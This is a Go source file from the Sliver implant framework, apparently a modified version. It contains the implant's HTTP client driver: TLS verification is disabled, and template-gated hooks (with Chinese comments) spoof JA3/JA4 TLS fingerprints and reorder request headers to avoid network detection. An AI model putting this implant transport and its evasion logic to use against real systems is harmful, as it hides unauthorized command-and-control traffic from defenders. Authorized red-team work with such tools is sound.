package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeHTTP}}
import (
	"crypto/tls"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/proxy"
)

// GoHTTPDriver - Pure Go HTTP driver
func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, error) {
	var transport *http.Transport
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // We don't care about the HTTP(S) layer certs
	}
	// {{if .Config.Debug}}
	if cryptography.TLSKeyLogger != nil {
		tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
	}
	// {{end}}
	if !secure {
		transport = &http.Transport{
			IdleConnTimeout:     time.Millisecond,
			Dial:                proxy.Direct.Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     tlsConfig,
		}
	} else {
		transport = &http.Transport{
			IdleConnTimeout: time.Millisecond,
			Dial: (&net.Dialer{
				Timeout: opts.NetTimeout,
			}).Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     tlsConfig,
		}
	}
	transport.ProxyConnectHeader = http.Header{
		"User-Agent": []string{userAgent},
	}
	client := &http.Client{
		Jar:       cookieJar(),
		Timeout:   opts.NetTimeout,
		Transport: transport,
	}
	// proxyURL 仅在指纹门控生效时才需要作为返回值;
	// 默认(全关)配置下保持与上游一致的调用形态,避免未使用变量导致编译失败。
	// {{if or .HTTPC2ImplantConfig.TlsEnabled .HTTPC2ImplantConfig.HttpHeaderOrder .HTTPC2ImplantConfig.HttpSuppressHeaders}}
	proxyURL := parseProxyConfig(origin, transport, opts.ProxyConfig)
	// {{else}}
	parseProxyConfig(origin, transport, opts.ProxyConfig)
	// {{end}}
	// {{if .HTTPC2ImplantConfig.TlsEnabled}}
	// uTLS 接管 HTTPS 拨号以定制 ClientHello(JA3/JA4)。
	// 注意:transport 在 DialTLSContext 生效时会忽略 Proxy 字段,
	// 代理隧道由 utlsDialTLSContext 内部自行建立。
	transport.DialTLSContext = utlsDialTLSContext(opts, proxyURL)
	// {{end}}
	// {{if or .HTTPC2ImplantConfig.HttpHeaderOrder .HTTPC2ImplantConfig.HttpSuppressHeaders}}
	// HTTP 请求头块指纹(J4H):包装连接以在写方向重排/删除头。
	// 必须在 uTLS 安装之后,才能包裹其返回的 uTLS 连接(改写发生在加密前)。
	installRequestFingerprint(transport, opts, proxyURL, secure)
	// {{end}}
	return client, nil
}

// parseProxyConfig - 解析并应用代理配置,返回解析后的代理 URL(无代理时返回 nil),
// 供 uTLS 拨号器复用同一代理决策。
func parseProxyConfig(origin string, transport *http.Transport, proxyConfig string) *url.URL {
	switch proxyConfig {
	case "never":
		return nil
	case "":
		fallthrough
	case "auto":
		p := proxy.NewProvider("").GetHTTPSProxy(origin)
		if p != nil {
			// {{if .Config.Debug}}
			log.Printf("Found proxy %#v\n", p)
			// {{end}}
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "https"
			}
			// {{if .Config.Debug}}
			log.Printf("Proxy URL = '%s'\n", proxyURL)
			// {{end}}
			transport.Proxy = http.ProxyURL(proxyURL)
			return proxyURL
		}
		return nil
	default:
		// {{if .Config.Debug}}
		log.Printf("Force proxy %#v\n", proxyConfig)
		// {{end}}
		proxyURL, err := url.Parse(proxyConfig)
		if err != nil {
			return nil
		}
		if proxyURL.Scheme == "" {
			proxyURL.Scheme = "https"
		}
		// {{if .Config.Debug}}
		log.Printf("Proxy URL = '%s'\n", proxyURL)
		// {{end}}
		transport.Proxy = http.ProxyURL(proxyURL)
		return proxyURL
	}
}

// Jar - CookieJar implementation that ignores domains/origins
type Jar struct {
	lk      sync.Mutex
	cookies []*http.Cookie
}

func cookieJar() *Jar {
	return &Jar{
		lk:      sync.Mutex{},
		cookies: []*http.Cookie{},
	}
}

// NewJar - Get a new instance of a cookie jar
func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make([]*http.Cookie, 0)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL (which is ignored).
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies = append(jar.cookies, cookies...)
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265 (which we do not).
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies
}

// {{end}} -IncludeHTTP
